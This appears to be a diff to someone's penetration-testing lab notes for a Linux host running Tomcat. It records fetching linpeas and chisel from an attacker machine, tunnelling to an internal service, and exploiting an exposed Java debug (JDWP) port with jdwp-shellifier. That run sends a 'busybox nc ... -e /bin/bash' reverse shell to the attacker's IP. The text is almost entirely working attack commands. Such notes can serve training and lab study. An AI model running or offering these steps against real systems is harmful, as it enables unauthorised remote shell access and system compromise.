@@ -238,17 +238,20 @@ wget http://192.168.45.234/linpeas.sh -O linpeas.sh
 # find writable dir
 /tmp/tomcat.14288260503985590587.8080
 /tmp/tomcat.14288260503985590587.8080/work/Tomcat/localhost/ROOT
+# we find jdwp from linpeas and easily search for exploit against it. also need to look in /opt to see the java files and determine the port needed to trigger the explloit
 
 # try to access internal web server running at 127.0.0.1:8000
 chisel server --port 8081 --reverse
 sudo tcpdump -nvvvXi tun0 tcp port 8081
 wget http://192.168.45.234/chisel -O chisel
 
-# access the internal webpage at 127.0.0.1:8001
+# access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
 ./chisel client 192.168.45.234:8081 R:8000:0.0.0.0:8000
 
-sudo systemctl status ssh
-sudo systemctl start ssh
+# jdwp exploit: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
 
-ssh -R 8000:localhost:8000 kali@192.168.45.234
+python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.234 1234 -e /bin/bash"
+# trigger with 
+nc 127.0.0.1 5000
+
 ```
